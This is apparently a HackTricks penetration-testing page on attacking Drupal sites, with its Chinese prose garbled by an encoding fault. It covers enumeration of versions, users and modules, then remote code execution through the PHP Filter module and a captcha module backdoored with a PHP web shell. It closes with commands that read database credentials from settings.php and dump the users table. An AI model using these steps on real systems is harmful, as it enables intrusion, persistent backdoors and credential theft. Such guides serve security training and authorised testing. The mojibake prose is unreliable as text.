# Drupal

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­è¢«å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## å‘ç°

* æ£€æŸ¥**meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **èŠ‚ç‚¹**: Drupal **ä½¿ç”¨èŠ‚ç‚¹ç´¢å¼•å…¶å†…å®¹**ã€‚ä¸€ä¸ªèŠ‚ç‚¹å¯ä»¥åŒ…å«ä»»ä½•å†…å®¹ï¼Œæ¯”å¦‚åšå®¢æ–‡ç« ã€æŠ•ç¥¨ã€æ–‡ç« ç­‰ã€‚é¡µé¢çš„URIé€šå¸¸é‡‡ç”¨`/node/<nodeid>`çš„å½¢å¼ã€‚
```bash
curl drupal-site.com/node/1
```
## æšä¸¾

Drupal é»˜è®¤æ”¯æŒ**ä¸‰ç§ç±»å‹çš„ç”¨æˆ·**ï¼š

1. **`ç®¡ç†å‘˜`**ï¼šæ­¤ç”¨æˆ·å¯¹Drupalç½‘ç«™æ‹¥æœ‰å®Œå…¨æ§åˆ¶æƒã€‚
2. **`å·²éªŒè¯ç”¨æˆ·`**ï¼šè¿™äº›ç”¨æˆ·å¯ä»¥ç™»å½•ç½‘ç«™ï¼Œå¹¶æ ¹æ®å…¶æƒé™æ‰§è¡Œæ“ä½œï¼Œå¦‚æ·»åŠ å’Œç¼–è¾‘æ–‡ç« ã€‚
3. **`åŒ¿åç”¨æˆ·`**ï¼šæ‰€æœ‰ç½‘ç«™è®¿é—®è€…éƒ½è¢«æŒ‡å®šä¸ºåŒ¿åç”¨æˆ·ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™äº›ç”¨æˆ·åªèƒ½é˜…è¯»å¸–å­ã€‚

### ç‰ˆæœ¬

* æ£€æŸ¥ `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Drupalçš„æ–°å®‰è£…é»˜è®¤é˜»æ­¢è®¿é—®`CHANGELOG.txt`å’Œ`README.txt`æ–‡ä»¶ã€‚
{% endhint %}

### ç”¨æˆ·åæšä¸¾

#### æ³¨å†Œ

åœ¨ _/user/register_ é¡µé¢å°è¯•åˆ›å»ºç”¨æˆ·åï¼Œå¦‚æœè¯¥åç§°å·²è¢«ä½¿ç”¨ï¼Œç³»ç»Ÿä¼šé€šçŸ¥ï¼š

![](<../../.gitbook/assets/image (328).png>)

#### è¯·æ±‚æ–°å¯†ç 

å¦‚æœæ‚¨ä¸ºç°æœ‰ç”¨æˆ·åè¯·æ±‚æ–°å¯†ç ï¼š

![](<../../.gitbook/assets/image (903).png>)

å¦‚æœæ‚¨ä¸ºä¸å­˜åœ¨çš„ç”¨æˆ·åè¯·æ±‚æ–°å¯†ç ï¼š

![](<../../.gitbook/assets/image (307).png>)

### è·å–ç”¨æˆ·æ•°é‡

è®¿é—® _/user/\<number>_ æ‚¨å¯ä»¥æŸ¥çœ‹ç°æœ‰ç”¨æˆ·çš„æ•°é‡ï¼Œä¾‹å¦‚åœ¨è¿™ç§æƒ…å†µä¸‹ä¸º2ï¼Œå› ä¸º _/users/3_ è¿”å›æœªæ‰¾åˆ°é”™è¯¯ï¼š

![](<../../.gitbook/assets/image (333).png>)

![](<../../.gitbook/assets/image (227) (1) (1) (1).png>)

### éšè—é¡µé¢

**å¯¹`/node/$`è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œå…¶ä¸­`$`æ˜¯ä¸€ä¸ªæ•°å­—**ï¼ˆä¾‹å¦‚ä»1åˆ°500ï¼‰ã€‚\
æ‚¨å¯èƒ½ä¼šå‘ç°**æœªè¢«æœç´¢å¼•æ“å¼•ç”¨çš„éšè—é¡µé¢**ï¼ˆæµ‹è¯•ã€å¼€å‘ç­‰ï¼‰ã€‚

#### å·²å®‰è£…æ¨¡å—ä¿¡æ¯
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### è‡ªåŠ¨åŒ–
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### ä½¿ç”¨ PHP è¿‡æ»¤å™¨æ¨¡å—

{% hint style="warning" %}
åœ¨ Drupal çš„æ—§ç‰ˆæœ¬ **(8 ç‰ˆæœ¬ä¹‹å‰)** ä¸­ï¼Œå¯ä»¥ç™»å½•ä¸ºç®¡ç†å‘˜å¹¶**å¯ç”¨ `PHP è¿‡æ»¤å™¨` æ¨¡å—**ï¼Œè¯¥æ¨¡å—"å…è®¸è¯„ä¼°åµŒå…¥çš„ PHP ä»£ç /ç‰‡æ®µ"ã€‚
{% endhint %}

æ‚¨éœ€è¦å®‰è£…**æ’ä»¶ php**ï¼ˆè®¿é—® _/modules/php_ å¹¶æ£€æŸ¥æ˜¯å¦è¿”å› **403**ï¼Œå¦‚æœè¿”å›ï¼Œåˆ™**å·²å®‰è£…**ï¼›å¦‚æœ**æœªæ‰¾åˆ°**ï¼Œåˆ™**æ’ä»¶ php æœªå®‰è£…**ï¼‰

è½¬åˆ° _Modules_ -> (**æ£€æŸ¥**) _PHP Filter_ -> _ä¿å­˜é…ç½®_

![](<../../.gitbook/assets/image (247) (1).png>)

ç„¶åç‚¹å‡» _æ·»åŠ å†…å®¹_ -> é€‰æ‹© _åŸºæœ¬é¡µé¢_ æˆ– _æ–‡ç« _ -> åœ¨æ­£æ–‡ä¸­ç¼–å†™ _php shellcode_ -> åœ¨ _æ–‡æœ¬æ ¼å¼_ ä¸­é€‰æ‹© _PHP ä»£ç _ -> é€‰æ‹© _é¢„è§ˆ_

![](<../../.gitbook/assets/image (338).png>)

æœ€ååªéœ€è®¿é—®æ–°åˆ›å»ºçš„èŠ‚ç‚¹ï¼š
```bash
curl http://drupal-site.local/node/3
```
### å®‰è£… PHP è¿‡æ»¤å™¨æ¨¡å—

ä»**8ç‰ˆæœ¬å¼€å§‹**ï¼Œ[**PHP è¿‡æ»¤å™¨**](https://www.drupal.org/project/php/releases/8.x-1.1) **æ¨¡å—ä¸å†é»˜è®¤å®‰è£…**ã€‚è¦ä½¿ç”¨æ­¤åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦**è‡ªå·±å®‰è£…è¯¥æ¨¡å—**ã€‚

1. ä» Drupal ç½‘ç«™ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„æ¨¡å—ã€‚
2. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
3. ä¸‹è½½å®Œæˆåï¼Œè½¬åˆ°**`ç®¡ç†`** > **`æŠ¥å‘Š`** > **`å¯ç”¨æ›´æ–°`**ã€‚
4. ç‚¹å‡»**`æµè§ˆ`**ï¼Œé€‰æ‹©ä»æˆ‘ä»¬ä¸‹è½½åˆ°çš„ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œç„¶åç‚¹å‡»**`å®‰è£…`**ã€‚
5. å®‰è£…å®Œæˆåï¼Œæˆ‘ä»¬å¯ä»¥ç‚¹å‡»**`å†…å®¹`**å¹¶**åˆ›å»ºä¸€ä¸ªæ–°çš„åŸºæœ¬é¡µé¢**ï¼Œç±»ä¼¼äºæˆ‘ä»¬åœ¨ Drupal 7 ç¤ºä¾‹ä¸­æ‰€åšçš„æ“ä½œã€‚å†æ¬¡ç¡®ä¿ä»**`æ–‡æœ¬æ ¼å¼`ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©`PHP ä»£ç `**ã€‚

### åé—¨æ¨¡å—

å¯ä»¥é€šè¿‡**å‘ç°æœ‰æ¨¡å—æ·»åŠ  shell**æ¥åˆ›å»ºåé—¨æ¨¡å—ã€‚å¯ä»¥åœ¨ drupal.org ç½‘ç«™ä¸Šæ‰¾åˆ°æ¨¡å—ã€‚è®©æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªæ¨¡å—ï¼Œæ¯”å¦‚[éªŒè¯ç ](https://www.drupal.org/project/captcha)ã€‚å‘ä¸‹æ»šåŠ¨å¹¶å¤åˆ¶ tar.gz [å­˜æ¡£](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz)çš„é“¾æ¥ã€‚

* ä¸‹è½½å­˜æ¡£å¹¶æå–å…¶å†…å®¹ã€‚
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* åˆ›å»ºä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„ **PHP Web Shell**ï¼š
```php
<?php
system($_GET["cmd"]);
?>
```
* æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª **`.htaccess`** æ–‡ä»¶æ¥è®©è‡ªå·±è®¿é—®è¯¥æ–‡ä»¶å¤¹ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸º Drupal æ‹’ç»ç›´æ¥è®¿é—® **`/modules`** æ–‡ä»¶å¤¹ã€‚
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* ä¸Šé¢çš„é…ç½®å°†åœ¨æˆ‘ä»¬è¯·æ±‚/modulesæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶æ—¶ï¼Œåº”ç”¨äº/folderçš„è§„åˆ™ã€‚å°†è¿™ä¸¤ä¸ªæ–‡ä»¶éƒ½å¤åˆ¶åˆ°captchaæ–‡ä»¶å¤¹ä¸­å¹¶åˆ›å»ºä¸€ä¸ªå­˜æ¡£ã€‚
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* å‡è®¾æˆ‘ä»¬å¯¹ç½‘ç«™å…·æœ‰**ç®¡ç†è®¿é—®æƒé™**ï¼Œç‚¹å‡»ä¾§è¾¹æ ä¸Šçš„**`ç®¡ç†`**ï¼Œç„¶åç‚¹å‡»**`æ‰©å±•`**ã€‚æ¥ä¸‹æ¥ï¼Œç‚¹å‡»**`+ å®‰è£…æ–°æ¨¡å—`**æŒ‰é’®ï¼Œæˆ‘ä»¬å°†è¢«å¸¦åˆ°å®‰è£…é¡µé¢ï¼Œä¾‹å¦‚`http://drupal-site.local/admin/modules/install`æµè§ˆåˆ°å¸¦åé—¨çš„éªŒè¯ç å­˜æ¡£å¹¶ç‚¹å‡»**`å®‰è£…`**ã€‚
* å®‰è£…æˆåŠŸåï¼Œæµè§ˆåˆ°**`/modules/captcha/shell.php`**ä»¥æ‰§è¡Œå‘½ä»¤ã€‚

## åæ¸—é€

### è¯»å– settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### ä»æ•°æ®åº“ä¸­å¯¼å‡ºç”¨æˆ·
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## å‚è€ƒèµ„æ–™

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
